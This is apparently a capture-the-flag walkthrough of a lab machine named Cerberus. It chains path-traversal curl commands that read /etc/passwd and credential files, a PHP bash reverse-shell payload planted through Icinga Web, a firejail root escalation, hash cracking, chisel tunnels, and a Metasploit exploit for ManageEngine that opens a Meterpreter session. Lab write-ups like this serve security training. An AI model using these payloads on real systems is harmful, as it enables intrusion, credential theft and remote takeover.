# Foothold

## Exploitation

### Arbitrary File Disclosure (CVE-2022-24716)

We are presented with an installation of Icinga Web 2. After some research I discovered that this application is vulnerable to a path traversal vulnerability.  

[Icinga Web Path Traversal](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/)

```bash
# To get /etc/passwd
curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/passwd
```

Further research of Icinga Web revealed where interesting config files are located. So I started to check for credentials and anything else.  

Following files are interesting to me:  
- **/etc/icingaweb2/roles.ini**
- **/etc/incingaweb2/resources.ini** 

```bash
# Who's admin?
curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/roles.ini

# Found an user and password here
curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini
```

### Password Reuse

Using the credentials found in the resources.ini I was able to login as Matthew which is an administrator.  

### Remote Code Execution (CVE-2022-24715)

Let's start with some basics and create a SSH-Keypair

```bash
ssh-keygen -t rsa -m PEM
```

Next we need to create a new SSH resource in icingaweb.  
Can be done here: **Configuration -> Resources -> Create a New Resource**

```
Resource Name: ssh-user
User: ssh-user
Private Key: <Your generated Key>
```

Verify that it was stored as expected  

```bash
curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/ssh/ssh-user
```

Now the fun part, let's get a remote code execution  
Again I was creating a new resource but this time changing some of the parts  

```
Resource Name: SHELL
User: ../../../../../dev/shm/run.php
Private Key: file:///etc/icingaweb2/ssh/ssh-user%00 <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.70/53 0>&1'");
```

Next go to **Configuration -> Application** and change the Module Path to include /dev/

```bash
WHATEVER:/dev/
```

Now just go to **Configuration -> Modules** and enable **shm** and you will receive your shell in a couple of seconds.  

```bash

### Privilege Escalation (CVE-2022-31214)

Now I'm www-data but haven't got any special rights and can't read anything interesting.  
Lets see if I'm able to escalate.  

After running linpeas I found a possible way to escalate my privileges to root.  

```bash
-rwsr-xr-x 1 root root 15K Feb  4  2021 /usr/sbin/ccreds_chkpwd (Unknown SUID binary!)                                                                                                                                                                                        
-rwsr-xr-x 1 root root 464K Jan 19  2022 /usr/bin/firejail (Unknown SUID binary!)
```

Accoring to [Firejail - Improper Privilege Management](https://security.snyk.io/vuln/SNYK-DEBIANUNSTABLE-FIREJAIL-2863507) firejail can be abused to gain further privileges.  
A quick search revealed a thread with a [POC](https://www.openwall.com/lists/oss-security/2022/06/08/10)

Using that POC will elevate my privileges to root within the container.

### Cached Passwords

I know that this machine is domain joined so I was looking at the usual configs like sssd.conf.  

```
[domain/cerberus.local]
default_shell = /bin/bash
ad_server = cerberus.local
krb5_store_password_if_offline = True
cache_credentials = True
```

Looked promising so I checked **/var/lib/sss/db** and discovered **cache_cerberus.local.ldb**  

```bash
strings cache_cerberus.local.ldb
# Found a cached password for uid 1000 (matthew)
```

Cracking the hash was easy and was done in seconds

```bash
hashcat -a 0 -m 1800 hashes.txt /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt
```

### Moving Lateral

Last part of the journey to the first flag is to get onto the virtualization host. I already discovered that Port 5985(winrm) was open so I used chisel for portforwarding

```bash
# My Machine
chisel_lnx server -p 8001 --reverse

# Remote Target
chisel_lnx client 10.10.14.70:8001 R:5985:172.16.22.1:5985
```

Now it's time to use evil-winrm

```bash
evil-winrm -p 'CENSORED' -u 'matthew' -i 127.0.0.1
```

```powershell
*Evil-WinRM* PS C:\Users\matthew\Documents> whoami
cerberus\matthew
```

# Escalation

## Local Enumeration

First I checked **C:/Program Files(x86)** and discovered that ManageEngine ADSelfService Plus was installed.  
As far as I know there were several vulnerabilities reported last year so I assumed that I can use it to escalate privileges.  

## Remote Code Execution (CVE-2022-47966)

You can read more about the vulnerability [HERE](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html)

Not a fan of metasploit but I'll use it this time due to it's reliable exoploit. 

First let's start with establishing a new chisel session.  

```bash
# My Machine
chisel_lnx server -p 8002 --reverse

# Remote Target
chisel_win.exe client 10.10.14.70:8002 R:1080:socks
```

Just to be sure let's scan some ports

```bash
proxychains -q nmap -v -Pn -sV -sC -p- 172.16.22.1
```

```bash
Discovered open port 80/tcp on 172.16.22.1
Discovered open port 135/tcp on 172.16.22.1
Discovered open port 53/tcp on 172.16.22.1
Discovered open port 139/tcp on 172.16.22.1
Discovered open port 8888/tcp on 172.16.22.1
Discovered open port 443/tcp on 172.16.22.1
Discovered open port 445/tcp on 172.16.22.1
```

Visiting https://dc.cerberus.local:8888 will redirect to https://dc.cerberus.local:9251/ which is the Login Page for ManageEngine ADSerlService Plus.

### GUID

If I login as **matthew** I get redirected but have no rights to access to application. Nevertheless it provides me the GUID which is needed.

```bash
# GUID
67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
```

### Issuer URL

This one is up to you ;) Was alot of work to find the issue url.  

### Metasploit

Now I do have everthing I need to exploit the vulnerability

```bash
proxychains -q msfconsole

# Set the exploit
use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966

# Configure
set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
set ISSUER_URL http://dc.cerberus.local/adfs/CENSORED
set RHOSTS 172.16.22.1
set LHOST tun0

# Run it
exploit

[*] Started reverse TCP handler on 10.10.14.70:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Sending stage (175686 bytes) to 10.129.190.97
[*] Meterpreter session 1 opened (10.10.14.70:4444 -> 10.129.190.97:61330) at 2023-03-21 20:40:43 +0100
```


## Root

Using the meterpreter session I'm an Administratator on the system and can access all the folders

```bash
meterpreter > dir "C:\Users\Administrator\Desktop"
Listing: C:\Users\Administrator\Desktop
